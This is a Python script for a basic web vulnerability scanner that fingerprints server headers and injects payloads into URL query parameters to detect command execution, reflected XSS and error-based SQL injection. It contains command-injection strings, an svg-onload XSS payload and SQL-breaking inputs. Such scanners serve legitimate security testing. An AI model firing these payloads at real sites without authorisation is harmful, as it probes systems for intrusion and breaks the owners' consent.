#!/usr/bin/env python3
import re
import time
import urllib.request
import urllib.parse
from urllib.error import HTTPError, URLError

# Colors for Output (ANSI Colors)
class Colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"

ga = Colors()

# HTTP Headers Handling
class HTTPHeader:
    HOST = "Host"
    SERVER = "Server"

# Utility to Print Styled Messages
def print_message(message, color):
    print(f"{color}{message}{ga.end}")

# Function to Read and Display HTTP Headers
def headers_reader(url):
    """Fingerprint backend technologies by examining HTTP headers."""
    print_message("\n[!] Fingerprinting the backend Technologies.", ga.bold)
    try:
        response = urllib.request.urlopen(url)
        if response.status == 200:
            print_message("[!] Status code: 200 OK", ga.green)
        elif response.status == 404:
            print_message("[!] Page not found! Check the URL.", ga.red)
            return

        server = response.headers.get(HTTPHeader.SERVER, "Unknown")
        host = urllib.parse.urlparse(url).netloc

        print_message(f"[!] Host: {host}", ga.green)
        print_message(f"[!] WebServer: {server}", ga.green)

        for key, value in response.headers.items():
            if "x-powered-by" in key.lower():
                print_message(f"[!] {key}: {value}", ga.green)

    except HTTPError as e:
        print_message(f"[!] HTTP Error: {e.code} - {e.reason}", ga.red)
    except URLError as e:
        print_message(f"[!] URL Error: {e.reason}", ga.red)
    except Exception as e:
        print_message(f"[!] Error: {str(e)}", ga.red)

# Main Function to Test Payloads
def test_payloads(url, payloads, regex_pattern):
    """Test a list of payloads against the given URL and check for vulnerabilities."""
    vulnerabilities = 0
    try:
        for params in url.split("?")[1].split("&"):
            for payload in payloads:
                modified_url = url.replace(params, params + str(payload).strip())
                try:
                    response = urllib.request.urlopen(modified_url)
                    html = response.read().decode("utf-8")
                    if re.search(regex_pattern, html):
                        vulnerabilities += 1
                        print_message("\n[*] Payload Found!", ga.red)
                        print_message(f"[*] Payload: {payload}", ga.red)
                        print_message(f"[!] Exploitation URL: {modified_url}", ga.blue)
                except HTTPError as e:
                    print_message(f"[!] HTTP Error while testing payload {payload}: {e.code}", ga.yellow)
                except Exception as e:
                    print_message(f"[!] Error testing payload {payload}: {str(e)}", ga.yellow)

        if vulnerabilities == 0:
            print_message("[!] No vulnerabilities found!", ga.green)
        else:
            print_message(f"[!] Found {vulnerabilities} vulnerabilities!", ga.blue)

    except Exception as e:
        print_message(f"[!] Error during testing: {str(e)}", ga.red)

# Remote Code Execution Detection
def detect_rce(url):
    """Detect Remote Code/Command Execution vulnerabilities."""
    headers_reader(url)
    print_message("\n[!] Scanning for Remote Code/Command Execution", ga.bold)
    payloads = [
        ';${@print(md5(dadevil))}',
        ';uname;',
        '&&dir',
        '&&type C:\\boot.ini',
        ';phpinfo();'
    ]
    regex_pattern = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\\(\\)|SERVER_ADDR|Volume.+Serial|\\[boot", re.I)
    test_payloads(url, payloads, regex_pattern)

# Cross-Site Scripting Detection
def detect_xss(url):
    """Detect Cross-Site Scripting vulnerabilities."""
    print_message("\n[!] Scanning for XSS", ga.bold)
    payloads = [
        "%27%3EJUNAI0%3Csvg%2Fonload%3Dconfirm%28%2FJUNAI%2F%29%3Eweb",
        "%78%22%78%3e%78"
    ]
    regex_pattern = re.compile("JUNAI<svg|x>x", re.I)
    test_payloads(url, payloads, regex_pattern)

# SQL Injection Detection
def detect_sql_injection(url):
    """Detect SQL Injection vulnerabilities."""
    print_message("\n[!] Scanning for Error-Based SQL Injection", ga.bold)
    payloads = [
        "3'", 
        "3%5c", 
        "3%27%22%28%29", 
        "3'><"
    ]
    regex_pattern = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server", re.I)
    test_payloads(url, payloads, regex_pattern)

# Entry Point
if __name__ == "__main__":
    print_message("\n[+] Starting Vulnerability Scanner...", ga.bold)
    url = input(ga.green + "[!] Enter the URL to scan: " + ga.end)

    # Perform different scans
    detect_rce(url)
    detect_xss(url)
    detect_sql_injection(url)
